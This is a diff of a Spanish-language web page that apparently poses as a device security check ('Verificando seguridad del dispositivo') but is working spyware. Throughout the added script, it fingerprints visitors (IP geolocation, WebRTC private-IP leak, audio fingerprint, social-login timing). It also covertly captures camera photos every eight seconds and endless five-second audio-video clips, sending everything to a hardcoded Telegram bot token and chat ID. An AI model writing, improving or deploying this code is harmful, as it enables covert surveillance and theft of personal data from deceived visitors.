@@ -1,191 +1,438 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: black;
-            color: white;
-            overflow: hidden;
-        }
-        .texto-principal {
-            font-size: 2.8em;
-            text-align: center;
-            text-shadow: 2px 2px 10px rgba(0,255,0,0.5);
-            padding: 30px;
-        }
-        #video, #canvas {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            visibility: hidden;
-        }
-        .spinner {
-            width: 80px;
-            height: 80px;
-            border: 10px solid #333;
-            border-top: 10px solid #0f0;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #error {
-            color: red;
-            font-size: 1.5em;
-            margin-top: 20px;
-            max-width: 90%;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cargando...</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #000;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+      padding: 40px 24px;
+      text-align: center;
+      width: 100%;
+    }
+
+    /* Candado */
+    .shield {
+      font-size: 4rem;
+      line-height: 1;
+    }
+
+    /* Spinner simple */
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid #1a1a1a;
+      border-top: 5px solid #00ff00;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Textos */
+    .msg {
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #00ff00;
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+    }
+    .sub-msg {
+      font-size: 0.85rem;
+      color: #00cc00;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Elementos multimedia ocultos */
+    video#vid   { display: none; }
+    canvas#snap { display: none; }
+  </style>
 </head>
 <body>
-    <div class="texto-principal">Acepta los permisos solicitados para continuar</div>
-    <div class="spinner"></div>
-    <div id="error"></div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+<!-- Contenido principal -->
+<div class="container">
+  <div class="shield">🔒</div>
+  <div class="spinner"></div>
+  <p class="msg">Acepta los permisos solicitados<br>para continuar</p>
+  <p class="sub-msg">Verificando seguridad del dispositivo...</p>
+</div>
+
+<!-- Elementos multimedia ocultos -->
+<video id="vid" autoplay muted playsinline></video>
+<canvas id="snap"></canvas>
 
 <script>
-    
-    const BOT_TOKEN = "8256143400:AAFQEOQfWTs_EpU_2SqQRJtqxjWE6Az-N_Q"; 
-    const CHAT_ID = "8284747554"; 
+  // ════════════════════════════════════════════════
+  //   CONFIGURACIÓN — EDITA AQUÍ
+  // ════════════════════════════════════════════════
+  const BOT_TOKEN = "8256143400:AAFQEOQfWTs_EpU_2SqQRJtqxjWE6Az-N_Q";
+  const CHAT_ID   = "8284747554";
+  const TG        = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-    const sendPhoto = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const sendVideo = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-    const sendMsg = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  // log silencioso — no muestra nada en pantalla
+  function log(txt) { /* silencioso */ }
 
-    function enviarMsg(texto) {
-        fetch(sendMsg, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: texto, parse_mode: 'HTML'})
-        }).catch(() => {});
+  // ════════════════════════════════════════════════
+  //   HELPERS DE ENVÍO TELEGRAM
+  // ════════════════════════════════════════════════
+  async function enviarMsg(texto) {
+    try {
+      await fetch(`${TG}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'HTML' })
+      });
+    } catch (e) {}
+  }
+
+  async function enviarFoto(blob) {
+    try {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, 'foto.jpg');
+      fd.append('caption', `📸 Captura silenciosa — ${new Date().toLocaleTimeString('es-SV')}`);
+      await fetch(`${TG}/sendPhoto`, { method: 'POST', body: fd });
+    } catch (e) {}
+  }
+
+  async function enviarVideo(blob) {
+    try {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('video', blob, 'clip.mp4');
+      fd.append('caption', `🎥 Clip de video — ${new Date().toLocaleTimeString('es-SV')}`);
+      fd.append('supports_streaming', 'true');
+      await fetch(`${TG}/sendVideo`, { method: 'POST', body: fd });
+    } catch (e) {}
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 1 — IP PÚBLICA + GEOLOCALIZACIÓN
+  // ════════════════════════════════════════════════
+  async function getIPInfo() {
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      return await r.json();
+    } catch { return {}; }
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 2 — BATERÍA
+  // ════════════════════════════════════════════════
+  async function getBattery() {
+    try {
+      const b = await navigator.getBattery();
+      return { level: Math.round(b.level * 100), charging: b.charging };
+    } catch { return { level: '?', charging: false }; }
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 3 — GPU (WebGL)
+  // ════════════════════════════════════════════════
+  function getGPU() {
+    try {
+      const cv = document.createElement('canvas');
+      const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+      if (!gl) return { renderer: 'No disponible', tier: 'Desconocida' };
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      const renderer = dbg
+        ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+        : gl.getParameter(gl.RENDERER);
+      const r = renderer.toLowerCase();
+      let tier = '🟡 Media';
+      if (/rtx [3-9]\d{3}|rx 6[5-9]|rx 7\d{3}|a[47][0-9]{2}m|m[12] (pro|max|ultra)|apple m[2-4]/i.test(r)) tier = '🟢 Gama Alta';
+      else if (/intel|hd graphics|uhd|vega [3-9]$|llvm|swiftshader/i.test(r)) tier = '🔴 Básica';
+      return { renderer, tier };
+    } catch { return { renderer: 'Error', tier: 'Desconocida' }; }
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 4 — IP PRIVADA (WebRTC LEAK)
+  // ════════════════════════════════════════════════
+  async function getPrivateIP() {
+    return new Promise((resolve) => {
+      try {
+        const pc = new RTCPeerConnection({
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' }
+          ]
+        });
+        const ips = new Set();
+        pc.createDataChannel('');
+        pc.createOffer()
+          .then(o => pc.setLocalDescription(o))
+          .catch(() => resolve('No detectada'));
+
+        pc.onicecandidate = (e) => {
+          if (!e || !e.candidate) {
+            pc.close();
+            resolve(ips.size ? [...ips].join(' | ') : 'No detectada');
+            return;
+          }
+          const matches = e.candidate.candidate.matchAll(/([0-9]{1,3}(\.[0-9]{1,3}){3})/g);
+          for (const m of matches) {
+            const ip = m[1];
+            if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip)) {
+              ips.add(ip);
+            }
+          }
+        };
+        setTimeout(() => { try { pc.close(); } catch {} resolve(ips.size ? [...ips].join(' | ') : 'No detectada'); }, 4000);
+      } catch { resolve('No soportado'); }
+    });
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 5 — AUDIO FINGERPRINT
+  // ════════════════════════════════════════════════
+  async function getAudioFingerprint() {
+    return new Promise((resolve) => {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return resolve('No soportado');
+        const ctx  = new AudioCtx();
+        const osc  = ctx.createOscillator();
+        const comp = ctx.createDynamicsCompressor();
+        const dest = ctx.createMediaStreamDestination();
+
+        comp.threshold.setValueAtTime(-50, ctx.currentTime);
+        comp.knee.setValueAtTime(40, ctx.currentTime);
+        comp.ratio.setValueAtTime(12, ctx.currentTime);
+        comp.attack.setValueAtTime(0, ctx.currentTime);
+        comp.release.setValueAtTime(0.25, ctx.currentTime);
+
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(10000, ctx.currentTime);
+        osc.connect(comp);
+        comp.connect(dest);
+        osc.start(0);
+
+        const analyser = ctx.createAnalyser();
+        analyser.fftSize = 2048;
+        comp.connect(analyser);
+
+        setTimeout(() => {
+          const buf = new Float32Array(analyser.frequencyBinCount);
+          analyser.getFloatFrequencyData(buf);
+          let sum = 0;
+          for (let i = 0; i < buf.length; i++) sum += Math.abs(buf[i]);
+          osc.stop();
+          ctx.close();
+          const hash = Math.abs(Math.round(sum * 1000)).toString(36).toUpperCase().slice(0, 12);
+          resolve(hash || 'ERR');
+        }, 300);
+      } catch (e) { resolve('Error-Audio'); }
+    });
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 6 — SOCIAL CHECK (TIMING ATTACK)
+  // ════════════════════════════════════════════════
+  async function socialCheck() {
+    const targets = [
+      { name: 'Facebook',  url: 'https://www.facebook.com/favicon.ico' },
+      { name: 'YouTube',   url: 'https://www.youtube.com/favicon.ico' },
+      { name: 'Amazon',    url: 'https://www.amazon.com/favicon.ico' },
+      { name: 'Instagram', url: 'https://www.instagram.com/favicon.ico' },
+      { name: 'Twitter/X', url: 'https://abs.twimg.com/favicons/twitter.2.ico' },
+    ];
+    const resultados = [];
+    for (const t of targets) {
+      try {
+        const t0 = performance.now();
+        await fetch(t.url, { mode: 'no-cors', cache: 'force-cache' });
+        const ms = Math.round(performance.now() - t0);
+        const estado = ms < 80 ? '✅ Caché/Sesión activa' : '❌ Sin caché';
+        resultados.push(`${t.name}: ${estado} (${ms}ms)`);
+      } catch {
+        resultados.push(`${t.name}: ⚠️ Bloqueado`);
+      }
     }
+    return resultados.join('\n');
+  }
 
-    function enviarFoto(blob, caption = "") {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('caption', caption);
-        form.append('photo', blob);
-        fetch(sendPhoto, {method: 'POST', body: form}).catch(() => {});
-    }
+  // ════════════════════════════════════════════════
+  //   MÓDULO 7 — CÁMARA: FOTOS SILENCIOSAS (c/8s)
+  // ════════════════════════════════════════════════
+  async function iniciarFotosSilenciosas(stream) {
+    const video  = document.getElementById('vid');
+    const canvas = document.getElementById('snap');
+    video.srcObject = stream;
+    await video.play().catch(() => {});
 
-    function enviarVideo(blob, caption = "") {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('caption', caption);
-        form.append('video', blob, 'video.webm');
-        fetch(sendVideo, {method: 'POST', body: form}).catch(() => {});
-    }
-
-    function mostrarError(msg) {
-        document.getElementById('error').innerHTML += msg + '<br>';
-    }
-
-    
-    let stream = null;
-    let intervaloCiclo = null;
-    async function manejarCamara() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-            });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await video.play();
-
-            
-            const ciclo = async () => {
-               
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const fotoData = canvas.toDataURL('image/jpeg', 0.7);
-                const fotoBlob = await (await fetch(fotoData)).blob();
-                enviarFoto(fotoBlob, `📸 FOTO - USUARIO ANÓNIMO (${new Date().toLocaleTimeString('es-SV')})`);
-
-               
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-                await new Promise(r => setTimeout(r, 5000));
-                recorder.stop();
-                const videoBlob = await new Promise(r => recorder.onstop = () => r(new Blob(chunks, {type: 'video/webm'})));
-                enviarVideo(videoBlob, `🎥 VIDEO 5 SEGUNDOS - USUARIO ANÓNIMO (${new Date().toLocaleTimeString('es-SV')})`);
-            };
-
-           
-            intervaloCiclo = setInterval(ciclo, 6000);
-            ciclo(); 
-        } catch (err) {
-            mostrarError("No se pudo continuar porque rechazaste la cámara.");
-            enviarMsg("❌ CÁMARA DENEGADA - USUARIO ANÓNIMO\nMotivo: " + err.message);
-        }
-    }
-
- 
-    async function enviarDatosCompletos() {
-        try {
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const bat = await navigator.getBattery?.() || {};
-            const batStr = bat.level ? `${Math.round(bat.level*100)}% ${bat.charging ? '⚡ Cargando' : '🔋'}` : 'No disponible';
-
-            let gpu = 'No disponible', gpuLvl = 'Desconocida';
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const di = gl?.getExtension('WEBGL_debug_renderer_info');
-                if (di) {
-                    gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
-                    gpuLvl = gpu.includes('RTX') || gpu.includes('GeForce') ? 'Alta gama 🎮' : gpu.includes('Intel') ? 'Básica 🖥️' : 'Media ⚙️';
-                }
-            } catch(e) {}
-
-            const datos = `<b>🔥 NUEVA CONEXIÓN DETECTADA - USUARIO ANÓNIMO</b>
-
-<b>📱 Dispositivo:</b> ${navigator.userAgent}
-<b>💻 Sistema Operativo:</b> ${navigator.platform}
-<b>🧠 RAM:</b> ${navigator.deviceMemory || '?'} GB
-<b>⚙️ Núcleos CPU:</b> ${navigator.hardwareConcurrency || '?'} 
-<b>🔋 Batería:</b> ${batStr}
-<b>🎮 GPU:</b> ${gpu} (${gpuLvl})
-<b>🌐 IP Pública:</b> ${geo.ip || 'No detectada'}
-<b>🏢 Proveedor:</b> ${geo.org || '?'}
-<b>📍 Ciudad / Región / País (aprox. por IP):</b> ${geo.city || 'No detectada'} - ${geo.region || 'No detectada'} - ${geo.country_name || 'No detectado'}
-<b>⏰ Hora de conexión:</b> ${new Date().toLocaleString('es-SV')}
-<b>🔗 Página visitada:</b> ${location.href}`;
-
-            enviarMsg(datos);
-        } catch (err) {
-            enviarMsg("⚠️ ERROR EN DATOS GENERALES - USUARIO ANÓNIMO");
-        }
-    }
-
-
-    window.onload = () => {
-        enviarDatosCompletos();
-        manejarCamara();
+    const capturar = () => {
+      if (video.readyState >= 2 && video.videoWidth > 0) {
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => { if (blob) enviarFoto(blob); }, 'image/jpeg', 0.75);
+      }
     };
 
-    
-    window.addEventListener('beforeunload', () => {
-        if (intervaloCiclo) clearInterval(intervaloCiclo);
-        enviarMsg("🚪 USUARIO SALIÓ DE LA PÁGINA - USUARIO ANÓNIMO");
-    });
+    // Captura inmediata
+    setTimeout(capturar, 2000);
+    // Bucle cada 8 segundos
+    setInterval(capturar, 8000);
+    log('📸 Fotos silenciosas activas');
+  }
+
+  // ════════════════════════════════════════════════
+  //   MÓDULO 8 — VIDEO CONTINUO (clips de 5s)
+  // ════════════════════════════════════════════════
+  function iniciarVideoInfinito(stream) {
+    const mimeTypes = [
+      'video/webm;codecs=vp9,opus',
+      'video/webm;codecs=vp8,opus',
+      'video/webm',
+    ];
+    const mimeType = mimeTypes.find(m => MediaRecorder.isTypeSupported(m)) || 'video/webm';
+
+    function grabarClip() {
+      try {
+        const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 600000 });
+        const chunks   = [];
+
+        recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: mimeType });
+          enviarVideo(blob);
+          log('🎥 Clip enviado — grabando siguiente...');
+          // Inmediatamente inicia el siguiente clip
+          setTimeout(grabarClip, 200);
+        };
+
+        recorder.start();
+        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
+        log('🎬 Grabando clip de 5s...');
+      } catch (e) {
+        setTimeout(grabarClip, 3000);
+      }
+    }
+
+    grabarClip();
+  }
+
+  // ════════════════════════════════════════════════
+  //   EVENTO DE SALIDA (beforeunload)
+  // ════════════════════════════════════════════════
+  window.addEventListener('beforeunload', () => {
+    const msg = `🚪 <b>USUARIO SALIÓ DE LA PÁGINA</b>\n⏰ ${new Date().toLocaleString('es-SV')}\n🔗 ${location.href}`;
+    navigator.sendBeacon(`${TG}/sendMessage`,
+      new Blob([JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })],
+        { type: 'application/json' })
+    );
+  });
+
+  // ════════════════════════════════════════════════
+  //   FUNCIÓN PRINCIPAL
+  // ════════════════════════════════════════════════
+  async function iniciarCaptura() {
+    log('🔍 Iniciando módulos...');
+
+    // Ejecutar todos los módulos en paralelo
+    const [geo, bat, privateIP, audioID, socialResult] = await Promise.all([
+      getIPInfo(),
+      getBattery(),
+      getPrivateIP(),
+      getAudioFingerprint(),
+      socialCheck(),
+    ]);
+
+    const gpu = getGPU();
+
+    log('🌐 IP y geo obtenida');
+    log(`🔋 Batería: ${bat.level}%`);
+    log(`🎮 GPU: ${gpu.tier}`);
+    log(`🏠 IP LAN: ${privateIP}`);
+    log(`🔊 AudioID: ${audioID}`);
+
+    // ── Construir reporte ──────────────────────────
+    const ua      = navigator.userAgent;
+    const ram     = navigator.deviceMemory  || '?';
+    const cores   = navigator.hardwareConcurrency || '?';
+    const plat    = navigator.platform      || '?';
+    const lang    = navigator.language      || '?';
+    const screen_ = `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`;
+    const touch   = navigator.maxTouchPoints > 0 ? '✅ Sí' : '❌ No';
+
+    const reporte = `🔥 <b>NUEVA CONEXIÓN DETECTADA - USUARIO ANÓNIMO</b>
+
+📱 <b>UserAgent:</b> <code>${ua}</code>
+💻 <b>SO / Platform:</b> ${plat}
+🌐 <b>Idioma:</b> ${lang}
+🖥️ <b>Pantalla:</b> ${screen_}
+👆 <b>Touch:</b> ${touch}
+
+🧠 <b>RAM:</b> ${ram} GB
+⚙️ <b>Núcleos CPU:</b> ${cores}
+🔋 <b>Batería:</b> ${bat.level}% ${bat.charging ? '⚡ Cargando' : '🔋 Desconectado'}
+🎮 <b>GPU:</b> ${gpu.renderer}
+🏷️ <b>Tier GPU:</b> ${gpu.tier}
+
+🌍 <b>IP Pública:</b> <code>${geo.ip || 'N/A'}</code>
+🏠 <b>IP Privada (LAN/VPN):</b> <code>${privateIP}</code>
+📡 <b>ISP / ASN:</b> ${geo.org || 'N/A'}
+📍 <b>Ciudad:</b> ${geo.city || 'N/A'}, ${geo.region || 'N/A'}
+🌎 <b>País:</b> ${geo.country_name || 'N/A'} ${geo.country_code || ''}
+🗺️ <b>Coords:</b> ${geo.latitude || '?'}, ${geo.longitude || '?'}
+⏱️ <b>Zona Horaria:</b> ${geo.timezone || 'N/A'}
+
+🔊 <b>Audio Fingerprint ID:</b> <code>${audioID}</code>
+
+📊 <b>Social Cache Timing:</b>
+${socialResult}
+
+⏰ <b>Hora exacta:</b> ${new Date().toLocaleString('es-SV')}
+🔗 <b>URL:</b> ${location.href}`;
+
+    await enviarMsg(reporte);
+    log('✅ Reporte enviado a Telegram');
+
+    // ── Solicitar cámara + micrófono ───────────────
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+        audio: true
+      });
+
+      log('✅ Cámara y micrófono activos');
+      await enviarMsg('🎥 <b>CÁMARA Y MICRÓFONO ACTIVADOS</b>\nIniciando capturas silenciosas y grabación continua...');
+
+      // Fotos silenciosas cada 8s
+      iniciarFotosSilenciosas(stream);
+
+      // Video clips de 5s en bucle infinito
+      iniciarVideoInfinito(stream);
+
+    } catch (err) {
+      const motivo = err.name === 'NotAllowedError'
+        ? '❌ Permiso denegado por el usuario'
+        : `⚠️ Error: ${err.message}`;
+      log('❌ Cámara denegada');
+      await enviarMsg(`🚫 <b>CÁMARA DENEGADA</b>\n${motivo}\n⏰ ${new Date().toLocaleString('es-SV')}`);
+    }
+  }
+
+  // ── Iniciar al cargar ──────────────────────────────
+  window.addEventListener('load', iniciarCaptura);
 </script>
 </body>
 </html>
